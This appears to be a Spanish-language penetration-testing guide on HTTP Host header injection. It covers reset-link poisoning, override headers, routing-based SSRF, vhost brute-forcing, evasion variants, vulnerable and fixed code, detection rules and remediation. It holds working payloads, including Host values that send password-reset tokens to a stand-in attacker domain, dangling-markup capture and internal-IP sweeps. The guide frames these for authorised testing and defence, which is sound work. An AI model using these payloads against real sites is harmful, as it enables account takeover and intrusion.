# Ataques a la cabecera Host (Host Header Injection)

| Clasificación | |
|---|---|
| CWE | CWE-20 — Improper Input Validation; CWE-640 — Weak Password Recovery Mechanism for Forgotten Password (envenenamiento de restablecimiento); CWE-918 (SSRF por enrutamiento); CWE-346 — Origin Validation Error |
| OWASP Top 10:2025 | A07 — Authentication Failures (envenenamiento de restablecimiento); A01 — Broken Access Control (SSRF por enrutamiento, salto de vhost/admin); A02 — Security Misconfiguration (confianza en cabeceras de reenvío) |
| OWASP API Top 10:2023 | API8:2023 — Security Misconfiguration; API7:2023 — SSRF (enrutamiento) |
| WSTG | WSTG-INPV-17 (Testing for Host Header Injection) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (envenenamiento de restablecimiento de contraseña, cabeceras de anulación, SSRF por enrutamiento, hosts virtuales y paneles internos, ataques de estado de conexión, envenenamiento de caché, otros sumideros) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

La cabecera `Host` indica a qué sitio va dirigida la petición; en HTTP/2 su equivalente es la pseudo-cabecera `:authority`. La **controla el cliente** por completo. Detrás de proxies se añaden cabeceras de **reenvío** (*forwarding*), como `X-Forwarded-Host` o `Forwarded`, que transmiten el host original. Los problemas aparecen cuando:

- La aplicación **usa el host recibido para construir URLs absolutas** (enlaces de restablecimiento de contraseña, verificación de correo, redirecciones, recursos, `canonical`) sin compararlo con una lista de hosts válidos.
- La infraestructura **enruta** la petición según `Host` (balanceadores, proxies inversos, *ingress* de Kubernetes): un host arbitrario puede llevar la petición a sistemas internos (**SSRF por enrutamiento**).
- El servidor tiene varios **hosts virtuales** (*virtual hosts*: varios sitios en la misma IP) y uno interno (administración, preproducción) es accesible indicando su nombre.
- El framework confía en `X-Forwarded-Host` de **cualquier** cliente, no solo del proxy legítimo.

## 2. Dónde buscar (señales del reconocimiento)

- Flujos que envían correos con enlaces: "olvidé mi contraseña", verificación de email, invitaciones, enlaces mágicos de inicio de sesión, exportaciones enviadas por correo.
- Respuestas que reflejan el host: `Location`, `<link rel=canonical>`, `og:url`, `<script src="https://HOST/...">`, `<base href>`, JSON con URLs absolutas, cabeceras `Link`, `Content-Security-Policy` con el host.
- Varios dominios en la misma IP (certificados con SAN múltiples, `crt.sh`, DNS histórico), nombres internos filtrados (`admin.internal`, `staging`, `*.svc.cluster.local`).
- Proxies/balanceadores que responden distinto a hosts desconocidos (página por defecto de nginx, 421 *Misdirected Request*, error de Envoy `no healthy upstream`).
- Frameworks: Django (`ALLOWED_HOSTS`), Laravel (`TrustHosts`, `TrustProxies`), Rails (`config.hosts`), Express (`trust proxy`), Spring (`ForwardedHeaderFilter`), ASP.NET Core (`AllowedHosts`, `ForwardedHeadersOptions`), PHP (`$_SERVER['HTTP_HOST']`).

## 3. Detección segura (primeras sondas, no destructivas)

Usa un dominio propio con OAST (`corvus-<id>.oast.example`) para detectar también interacciones del servidor.

```http
GET / HTTP/1.1
Host: corvus-<id>.oast.example
```

```http
GET / HTTP/1.1
Host: target.example
X-Forwarded-Host: corvus-<id>.oast.example
```

Observa: ¿la petición llega a la aplicación (misma respuesta) o el proxy la rechaza?, ¿el valor se refleja?, ¿hay interacción DNS/HTTP en tu OAST (enrutamiento o fetch del servidor)? Repite con variantes de §5 si el host arbitrario se rechaza. Para el flujo de restablecimiento, usa **siempre tu propia cuenta de prueba** como destinataria del correo.

## 4. Explotación por contexto o tecnología

### 4.1 Envenenamiento del restablecimiento de contraseña

```http
POST /forgot-password HTTP/1.1
Host: corvus-<id>.oast.example
Content-Type: application/x-www-form-urlencoded

email=cuenta-prueba-B@auditor.example
```

Si el correo recibido en tu buzón de pruebas contiene `https://corvus-<id>.oast.example/reset?token=…`, cuando una víctima pulse el enlace su token llegará a tu servidor. Variantes cuando `Host` se valida:

```
X-Forwarded-Host: corvus-<id>.oast.example
Host: target.example:corvus-<id>.oast.example          # puerto no numérico concatenado
Host: target.example:443@corvus-<id>.oast.example      # userinfo en la URL generada
Host: corvus-<id>.oast.example.target.example           # comodín *.target.example con validación débil
Host: target.example
Host: corvus-<id>.oast.example                          # Host duplicado
```

**Marcado colgante** (*dangling markup*): si el host se inserta en el HTML del correo sin escapar, `Host: target.example:'<a href="//corvus-<id>.oast.example/?` puede capturar el resto del correo (incluido el token) cuando el cliente de correo cargue la URL. Además, escáneres de enlaces de los servidores de correo suelen visitar la URL automáticamente, lo que filtra el token sin que la víctima haga clic.

⚠️ Nunca solicites restablecimientos para cuentas de usuarios reales: provoca correos reales y puede bloquear cuentas. Usa cuentas propias; para demostrar el robo, pulsa tú el enlace del correo recibido y muestra el token en el registro de tu OAST.

### 4.2 Cabeceras de anulación del host

```
X-Forwarded-Host      X-Host               X-Forwarded-Server     X-HTTP-Host-Override
Forwarded: host=corvus.example;proto=https                         X-Original-Host
X-Forwarded-For / X-Real-IP / X-Client-IP: 127.0.0.1               # suplantar IP de origen para reglas de "solo localhost"
X-Original-URL: /admin     X-Rewrite-URL: /admin                    # reescritura de ruta (Symfony, IIS URL Rewrite)
```

Descubre cabeceras propias aceptadas con Param Miner ("Guess headers").

### 4.3 SSRF por enrutamiento (*routing-based SSRF*)

El balanceador o proxy reenvía la petición al host indicado. Indicios: interacción en tu OAST originada por la infraestructura, o respuestas distintas para IPs internas.

```http
GET / HTTP/1.1
Host: corvus-<id>.oast.example          # ¿llega una petición a tu OAST desde la IP del proxy?
```

```http
GET /admin HTTP/1.1
Host: 192.168.0.1                        # barre rangos internos con Intruder (lista corta, velocidad baja)
```

```http
GET http://target.example/ HTTP/1.1     # URL absoluta en la línea de petición: algunos proxies enrutan por ella
Host: 192.168.0.1                        # y otros por Host → discrepancia
```

Si funciona, aplica los objetivos internos de `vulns/ssrf.md` (metadatos cloud, paneles). En Kubernetes prueba nombres de servicio (`Host: <servicio>.<namespace>.svc.cluster.local`).

### 4.4 Hosts virtuales y paneles internos

```bash
# Fuerza bruta de vhosts sobre la IP del objetivo, filtrando el tamaño de la respuesta por defecto
ffuf -u https://<IP>/ -H 'Host: FUZZ.target.example' -w subdominios.txt -fs <tam_por_defecto> -rate 10
ffuf -u https://<IP>/ -H 'Host: FUZZ' -w nombres-internos.txt -fs <tam_por_defecto> -rate 10   # admin, intranet, localhost, staging…
```

Prueba también `Host: localhost`, `Host: 127.0.0.1`, `Host: admin`: algunas aplicaciones conceden acceso administrativo a "peticiones locales" según el host. Con TLS, el nombre en SNI y el `Host` pueden diferir (`curl --resolve` o Burp con SNI distinto) y un proxy puede validar solo uno.

### 4.5 Ataques de estado de conexión

Algunos proxies validan `Host` solo en la **primera** petición de una conexión *keep-alive* y enrutan las siguientes igual. En Burp, envía un grupo por una única conexión: primera petición con `Host: target.example`, segunda con `Host: 192.168.0.1` o `Host: localhost` hacia `/admin`.

### 4.6 Envenenamiento de caché con Host

Si el host se refleja en una página cacheable y la cabecera usada no forma parte de la clave (frecuente con `X-Forwarded-Host` o con el puerto de `Host`), el reflejo se sirve a todos. ⚠️ Usa siempre un cache buster; detalles en `vulns/cache-poisoning-deception.md`.

### 4.7 Otros sumideros

- Redirecciones abiertas generadas a partir del host (`Location: https://HOST/login`).
- Inyección en consultas o logs (el host llega a SQL, plantillas o ficheros de log): prueba los vectores de `vulns/sqli.md` y `vulns/ssti.md` en `Host` solo si se refleja en esos contextos.
- Generación de enlaces en SSR/plantillas (`{{ request.host }}`) y en APIs (`next`, `self` en paginación HATEOAS).
- OAuth/OIDC: `redirect_uri` derivada del host (ver `vulns/oauth-oidc-saml.md`).
- Cabecera `Origin`/`Referer` confundida con el host en comprobaciones de CORS/CSRF (ver `vulns/cors.md`, `vulns/csrf.md`).

## 5. Evasión de filtros y WAF

```
Host: target.example:corvus.example      Host: target.example:1337          # puerto no validado
Host: target.example@corvus.example      Host: corvus.example#target.example
Host: TARGET.example                     Host: target.example.               # mayúsculas, punto final
Host: corvus.example%2etarget.example    Host: target.example%00corvus.example
Host: target.example
Host: corvus.example                      # duplicada: front-end usa una, back-end otra
 Host: corvus.example                     # cabecera con sangría (line wrapping): algunos servidores la unen a la anterior
GET https://target.example/ HTTP/1.1  +  Host: corvus.example      # URL absoluta frente a Host
:authority: target.example  +  host: corvus.example                # HTTP/2: ambos presentes
```

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Cadena | Demostración segura |
|---|---|
| Restablecimiento envenenado → toma de cuenta | Cuenta de prueba propia: token capturado en el OAST; no lo uses sobre cuentas ajenas |
| Host reflejado + caché → XSS/redirección masiva | Con cache buster |
| SSRF por enrutamiento → red interna / metadatos | Ver `vulns/ssrf.md`; leer solo identificadores inocuos |
| Vhost interno → panel de administración | Captura de la página de inicio del panel; ⚠️ no ejecutar acciones |
| Estado de conexión → salto de controles del proxy | Tu segunda petición accede a una ruta restringida |
| Host en enlaces de verificación → verificación de emails ajenos | Con dos cuentas propias |

## 7. Caja blanca: fuentes, sumideros y patrones de código

Fuentes: `Host`, `:authority`, `X-Forwarded-Host`, `Forwarded`, `X-Host`. Sumideros: generación de URLs absolutas, correos, redirecciones, enrutamiento.

```php
// VULNERABLE
$link = 'https://' . $_SERVER['HTTP_HOST'] . '/reset?token=' . $token;
// SEGURO
$link = rtrim(getenv('APP_URL'), '/') . '/reset?token=' . urlencode($token);
// Laravel: middleware TrustHosts activo y TrustProxies con IPs concretas; APP_URL para URLs en correos
```

```python
# Django — SEGURO: ALLOWED_HOSTS explícito (nunca ['*']); USE_X_FORWARDED_HOST = False salvo proxy controlado
ALLOWED_HOSTS = ["app.example.com"]
# request.get_host() valida contra ALLOWED_HOSTS; para correos usar settings.SITE_URL
# Flask — VULNERABLE: url_for(..., _external=True) usa el Host recibido; SEGURO: SERVER_NAME configurado y TRUSTED_HOSTS (Flask 3.1+)
```

```js
// Express — VULNERABLE
const link = `${req.protocol}://${req.get('host')}/reset?token=${t}`;
// SEGURO
const link = new URL(`/reset?token=${encodeURIComponent(t)}`, process.env.APP_URL).href;
app.set('trust proxy', ['10.0.0.10']);   // solo el balanceador
```

```java
// Spring — VULNERABLE
String link = ServletUriComponentsBuilder.fromCurrentContextPath().path("/reset").queryParam("token", t).toUriString();
// (usa Host y, con ForwardedHeaderFilter, X-Forwarded-Host)
// SEGURO
String link = UriComponentsBuilder.fromUriString(appProperties.getBaseUrl()).path("/reset").queryParam("token", t).toUriString();
```

```csharp
// ASP.NET Core — VULNERABLE: Url.Action(..., protocol: Request.Scheme) usa Request.Host
// SEGURO: "AllowedHosts": "app.example.com" en appsettings.json (HostFilteringMiddleware)
// y URL base de configuración para correos; ForwardedHeadersOptions con KnownProxies
```

```go
// VULNERABLE
link := "https://" + r.Host + "/reset?token=" + t
// SEGURO
link := cfg.BaseURL + "/reset?token=" + url.QueryEscape(t)
```

```ruby
# Rails — SEGURO: config.hosts << "app.example.com" (HostAuthorization) y
# config.action_mailer.default_url_options = { host: "app.example.com", protocol: "https" }
```

```bash
rg -n --pcre2 "HTTP_HOST|SERVER_NAME|HTTP_X_FORWARDED_HOST|getHeader\(\"Host\"\)|req\.(get\('host'\)|hostname|headers\.host)|r\.Host\b|Request\.Host|request\.host\b|get_host\(\)" .
rg -n -i "ALLOWED_HOSTS|USE_X_FORWARDED_HOST|TrustHosts|TrustProxies|config\.hosts|trust proxy|AllowedHosts|ForwardedHeaders|forward-headers-strategy|_external=True|SERVER_NAME" .
rg -n -i "reset|forgot|verify|magic.?link|invite" --type-add 'tpl:*.{html,twig,erb,hbs,ejs,cshtml,jinja,j2}' -t tpl .
```

```yaml
rules:
  - id: corvus-host-header-in-link
    languages: [python]
    severity: WARNING
    message: URL absoluta construida con el host de la petición (posible envenenamiento de enlaces)
    pattern-either:
      - pattern: request.build_absolute_uri(...)
      - pattern: 'f"{request.scheme}://{request.get_host()}..."'
      - pattern: flask.url_for(..., _external=True, ...)
```

## 8. Falsos positivos frecuentes

- El host se refleja en la respuesta pero **no en ningún sumidero relevante** (no se cachea, no va a correos ni redirecciones): impacto bajo o informativo.
- El correo de restablecimiento usa el host arbitrario **solo en tu petición de prueba** porque el entorno de preproducción no tiene `APP_URL`: verifica en el entorno en alcance.
- Interacción OAST causada por un **escáner de seguridad o resolvedor** del cliente, no por enrutamiento: revisa IP y `User-Agent`.
- `Host` arbitrario aceptado por un **vhost por defecto** que sirve la misma aplicación sin usarlo: no hay impacto por sí solo.
- Tu herramienta reescribe `Host` antes de enviar (navegador, algunas librerías): usa Burp Repeater.

## 9. Evidencia mínima para validarlo

- Petición con la cabecera manipulada y respuesta.
- Para restablecimiento: correo recibido en la cuenta de prueba (cabeceras y cuerpo con el enlace envenenado) y registro OAST con el token al visitar el enlace.
- Para enrutamiento: registro OAST con la IP de la infraestructura del cliente, o respuesta de un servicio interno.
- Para vhosts: diferencia de respuesta (tamaño, título) entre host por defecto y host interno.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Host reflejado sin sumidero explotable | Informativo | — |
| Envenenamiento de restablecimiento → toma de cuenta (requiere clic) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Ídem con filtrado automático del token (escáner de correo, marcado colgante) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| SSRF por enrutamiento con lectura interna | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (8.6) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N` |
| Acceso a vhost/panel interno sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Envenenamiento de caché con XSS vía Host | ver `vulns/cache-poisoning-deception.md` | — |

Calcula la puntuación 4.0 exacta en la calculadora oficial de FIRST.

## 11. Remediación (con ejemplo de código correcto)

1. **Nunca construir URLs absolutas con el host de la petición**: usar una URL base de configuración (especialmente en correos).
2. **Lista blanca de hosts** en el framework (`ALLOWED_HOSTS`, `AllowedHosts`, `config.hosts`, `TrustHosts`) y en el proxy: rechazar con 400/421 cualquier host desconocido; vhost por defecto que no sirva la aplicación.
3. Confiar en `X-Forwarded-*`/`Forwarded` **solo desde proxies conocidos**, y que el proxy **sobrescriba** (no añada) esas cabeceras.
4. Separar sitios internos en otra infraestructura en lugar de vhosts en el mismo servidor público.
5. Proxies: validar `Host` en **cada** petición de la conexión; rechazar `Host` duplicado, URL absoluta discordante y discrepancia SNI/Host.
6. Tokens de restablecimiento de un solo uso, caducidad corta y ligados al usuario (ver `vulns/authentication.md`).

```nginx
# Vhost por defecto que rechaza hosts desconocidos + vhost real que fija las cabeceras hacia el origen
server { listen 443 ssl default_server; ssl_reject_handshake on; }
server {
    listen 443 ssl; server_name app.example.com;
    location / {
        proxy_set_header Host app.example.com;
        proxy_set_header X-Forwarded-Host app.example.com;
        proxy_set_header X-Forwarded-For $remote_addr;   # sobrescribe, no concatena
        proxy_pass http://app_backend;
    }
}
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater | Variantes de `Host`, cabeceras de anulación, grupos en una conexión | Siempre primero |
| Burp Collaborator / `interactsh-client` | Detectar enrutamiento y enlaces envenenados | Desde la primera sonda |
| Burp Param Miner | "Guess headers" para cabeceras de anulación propias | Tras confirmar reflejo |
| `ffuf` | Fuerza bruta de vhosts (`-H 'Host: FUZZ.target.example' -fs <tam>`) | Reconocimiento, con límite de velocidad |
| `curl` | `curl -sk --resolve app.example.com:443:<IP> https://app.example.com/ -H 'Host: admin.example.com'` | Probar SNI frente a Host |
| Burp Intruder | Barrido de IPs internas en `Host` (lista corta) | Tras indicios de SSRF por enrutamiento |

## 13. Referencias

- PortSwigger Web Security Academy — HTTP Host header attacks: https://portswigger.net/web-security/host-header
- James Kettle — "Cracking the Lens: Targeting HTTP's Hidden Attack Surface" (2017): https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
- James Kettle — "Practical HTTP Host header attacks" (2013)
- OWASP WSTG — WSTG-INPV-17 Testing for Host Header Injection
- OWASP — Forgot Password Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
- RFC 9110 §7.2 (Host y :authority) y RFC 7239 (cabecera `Forwarded`)
- PayloadsAllTheThings / HackTricks — Host Header Injection, Reset Password (book.hacktricks.wiki)
- CWE-640: https://cwe.mitre.org/data/definitions/640.html
